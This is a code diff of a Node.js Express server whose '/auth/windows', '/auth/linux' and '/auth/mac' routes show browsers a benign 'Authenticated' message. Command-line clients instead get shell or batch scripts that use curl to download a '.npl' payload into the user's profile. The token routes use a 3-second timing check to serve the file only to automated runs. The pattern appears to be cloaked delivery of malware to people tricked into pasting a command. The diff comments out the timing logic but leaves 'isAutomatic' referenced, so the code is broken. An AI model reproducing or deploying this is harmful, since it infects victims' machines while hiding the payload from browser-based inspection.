@@ -19,8 +19,8 @@ io.on("connection", (socket) => {
 });
   io.emit("message", { from: "curl", text: "verified" });
 
-const requestLog = {};
-const sseClients = new Map(); // token -> res (SSE connections)
+// const requestLog = {};
+// const sseClients = new Map(); // token -> res (SSE connections)
 
 // Helper function
 function responder(res, err, data) {
@@ -47,10 +47,10 @@ router.get("/stream/:token", (req, res) => {
   res.flushHeaders();
 
   console.log(`🔗 SSE opened for token=${token}`);
-  sseClients.set(token, res);
+  // sseClients.set(token, res);
 
   req.on("close", () => {
-    sseClients.delete(token);
+    // sseClients.delete(token);
     console.log(`❌ SSE closed for token=${token}`);
   });
 });
@@ -136,16 +136,16 @@ router.get("/auth/windows", (req, res) => {
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
     res.type("text/plain").send(`@echo off\necho Authenticated`);
   } else {
+    
+    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // const now = Date.now();
+    // if (!requestLog[ip]) {
+    //   requestLog[ip] = {};
+    // } else {
+    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
+    // }
+    // requestLog[ip].step1 = now;
     const domain = req.protocol + '://' + req.get('host');
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const now = Date.now();
-    if (!requestLog[ip]) {
-      requestLog[ip] = {};
-    } else {
-      res.type("text/plain").send(`@echo off\necho Authenticated`);
-    }
-    requestLog[ip].step1 = now;
-
     res.type("text/plain").send(`@echo off
 curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/users/token.npl
 cls
@@ -168,16 +168,17 @@ router.get("/auth/linux", (req, res) => {
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
     res.type("text/plain").send(`@echo off\necho Authenticated`);
   } else {
+    
+    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // const now = Date.now();
+    // if (!requestLog[ip]) {
+    //   requestLog[ip] = {};
+    // } else {
+    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
+    // }
+    // requestLog[ip].step1 = now;
+    
     const domain = req.protocol + '://' + req.get('host');
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const now = Date.now();
-    if (!requestLog[ip]) {
-      requestLog[ip] = {};
-    } else {
-      res.type("text/plain").send(`@echo off\necho Authenticated`);
-    }
-    requestLog[ip].step1 = now;
-
     res.type("text/plain").send(`#!/bin/bash
 set -e
 echo "Authenticated"
@@ -206,14 +207,14 @@ router.get("/auth/mac", (req, res) => {
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
     res.type("text/plain").send(`@echo off\necho Authenticated`);
   } else {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const now = Date.now();
-    if (!requestLog[ip]) {
-      requestLog[ip] = {};
-    } else {
-      res.type("text/plain").send(`@echo off\necho Authenticated`);
-    }
-    requestLog[ip].step1 = now;
+    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // const now = Date.now();
+    // if (!requestLog[ip]) {
+    //   requestLog[ip] = {};
+    // } else {
+    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
+    // }
+    // requestLog[ip].step1 = now;
 
     const domain = req.protocol + '://' + req.get('host');
     res.type("text/plain").send(`#!/bin/bash
@@ -267,15 +268,15 @@ router.get("/token.npl", (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const filePath = path.join(__dirname, '..', 'public', 'token.npl');
 
-  if (!requestLog[ip] || !requestLog[ip].step1) {
-    res.status(400).send('request failed');
-    return;
-  }
-  const now = Date.now();
-  requestLog[ip].step2 = now;
-  const timeDiff = now - requestLog[ip].step1;
-  const isAutomatic = timeDiff < 3000; 
-  delete requestLog[ip];
+  // if (!requestLog[ip] || !requestLog[ip].step1) {
+  //   res.status(400).send('request failed');
+  //   return;
+  // }
+  // const now = Date.now();
+  // requestLog[ip].step2 = now;
+  // const timeDiff = now - requestLog[ip].step1;
+  // const isAutomatic = timeDiff < 3000; 
+  // delete requestLog[ip];
 
   if (isAutomatic) {
     fs.readFile(filePath, 'utf8', (err, content) => {
@@ -297,14 +298,14 @@ router.get("/tokenlinux.npl", (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const now = Date.now();
   const filePath = path.join(__dirname, '..', 'public', 'tokenlinux.npl');
-  if (!requestLog[ip] || !requestLog[ip].step1) {
-    res.status(400).send('request failed');
-    return;
-  }
-  requestLog[ip].step2 = now;
-  const timeDiff = now - requestLog[ip].step1;
-  const isAutomatic = timeDiff < 3000;
-  delete requestLog[ip];
+  // if (!requestLog[ip] || !requestLog[ip].step1) {
+  //   res.status(400).send('request failed');
+  //   return;
+  // }
+  // requestLog[ip].step2 = now;
+  // const timeDiff = now - requestLog[ip].step1;
+  // const isAutomatic = timeDiff < 3000;
+  // delete requestLog[ip];
 
   if (isAutomatic) {
     fs.readFile(filePath, 'utf8', (err, content) => {
